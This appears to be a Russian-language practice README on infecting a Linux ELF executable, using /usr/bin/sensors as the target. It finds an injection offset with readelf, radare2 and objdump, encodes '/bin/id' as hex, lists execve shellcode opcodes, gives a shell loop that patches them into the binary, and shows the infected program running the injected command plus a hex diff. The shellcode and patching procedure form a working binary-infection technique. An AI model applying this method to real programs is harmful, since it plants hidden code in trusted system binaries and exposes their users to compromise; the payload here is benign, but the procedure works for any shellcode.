# virus-practice
Опишу практику заражения файлов elf в linux
Наш подопытный: /usr/bin/sensors

Для начала нам нужно убедиться, что программа не скомпилирована с бит защиты -fPIC. Для этого ищим в headers поля .got.plt (мы же не хотим исполнить команду в области памяти и получить segmentation fault):
````
readelf -a sensors|grep ".got.plt"
  [22] .got.plt          PROGBITS         0000000000006fe8  00006fe8
   05     .init_array .fini_array .data.rel.ro .dynamic .got .got.plt .data .bss 
   12     .init_array .fini_array .data.rel.ro .dynamic .got .got.plt 
````
00006fe8 - очень хорошо. Сразу узнаем смещение для инъекции
```
r2 -A /usr/bin/sensors
afl
0x000027f0    5     55 entry.fini0
q
objdump -d /usr/bin/sensors|grep -A2 "27f0"
    27f0:	f3 0f 1e fa          	endbr64
    27f4:	80 3d a5 48 00 00 00 	cmpb   $0x0,0x48a5(%rip)        # 0x70a0
    27fb:	75 33                	jne    0x2830
```
Смещение удачное у нас будет в a=0x000027f4 (запомнили)

Выбираем что будем инъектить. У меня будет выполнение команды /bin/id

Вот вам скрипт для перевода в hex
```
 odity@viva  ~/bin/elf  cat rev.py          
def rev_str(s):
    return s[:: - 1]
s = '/bin/id'
s= rev_str(s)
for i in s:
    t=hex(ord(i))
    print(t[2:])

```
Выполянем его и получаем ...
```
✘ odity@viva  ~/bin/elf  python rev.py|tr -d '\n'
64692f6e69622f%      
```
Почемуем строку в syscall-id.asm  и собраем его.  Вообще это лишнее,чтоб вам было понятнее что куда брать. Собрали, потом из исполняемого файла syscall-id получаем opcode команд наших:
```
objdump -d syscall-id
изассемблирование раздела .text:

0000000000401000 <.text>:
  401000:	48 31 d2             	xor    %rdx,%rdx
  401003:	52                   	push   %rdx
  401004:	48 b8 2f 62 69 6e 2f 	movabs $0x64692f6e69622f,%rax
  40100b:	69 64 00 
  40100e:	50                   	push   %rax
  40100f:	48 89 e7             	mov    %rsp,%rdi
  401012:	52                   	push   %rdx
  401013:	57                   	push   %rdi
  401014:	48 89 e6             	mov    %rsp,%rsi
  401017:	48 31 c0             	xor    %rax,%rax
  40101a:	b0 3b                	mov    $0x3b,%al
  40101c:	0f 05                	syscall
```

Вот начиная от 48 до 05 выписываем  opcode  и через мою утилиту hexedit генерируем инъекцию.... (последним будет opcode с3)

```
a=0x000027f4;for i in $(echo "48 31 d2 52 48 b8 2f 62 69 6e 2f 69 64 00 50 48 89 e7 52 57 48 89 e6 48 31 c0 b0 3b 0f 05 c3"); do printf "./hexedit sensors 0x0000%X 0x%02X\n" $(($a)) "0x"$i; a=0x0000$(([##16] $a+0x1));done
```
Смещение 0x000027f4 узнали ранее. Выполняем скрипт и потом уже сам файл и...

```
 odity@viva  ~/bin/elf  ./sensors 
coretemp-isa-0000
Adapter: ISA adapter
Package id 0:  +22.0°C  (high = +84.0°C, crit = +100.0°C)
Core 0:        +19.0°C  (high = +84.0°C, crit = +100.0°C)
Core 1:        +21.0°C  (high = +84.0°C, crit = +100.0°C)
Core 2:        +19.0°C  (high = +84.0°C, crit = +100.0°C)
Core 3:        +19.0°C  (high = +84.0°C, crit = +100.0°C)

acpitz-acpi-0
Adapter: ACPI interface
temp1:        +27.8°C  
temp2:        +29.8°C  

uid=1000(odity) gid=1000(odity) groups=1000(odity),958(libvirt-qemu),959(libvirt),992(kvm),998(wheel)
```

Сравниваем исходный файл с крякнутым.

```
640,642c640,642
< 000027f0: f30f 1efa 4831 d252 48b8 2f62 696e 2f69  ....H1.RH./bin/i
< 00002800: 6400 5048 89e7 5257 4889 e648 31c0 b03b  d.PH..RWH..H1..;
< 00002810: 0f05 c315 a047 0000 e863 ffff ffc6 057c  .....G...c.....|
---
> 000027f0: f30f 1efa 803d a548 0000 0075 3355 4883  .....=.H...u3UH.
> 00002800: 3db2 4700 0000 4889 e574 0d48 8b3d f647  =.G...H..t.H.=.G
> 00002810: 0000 ff15 a047 0000 e863 ffff ffc6 057c  .....G...c.....|
```
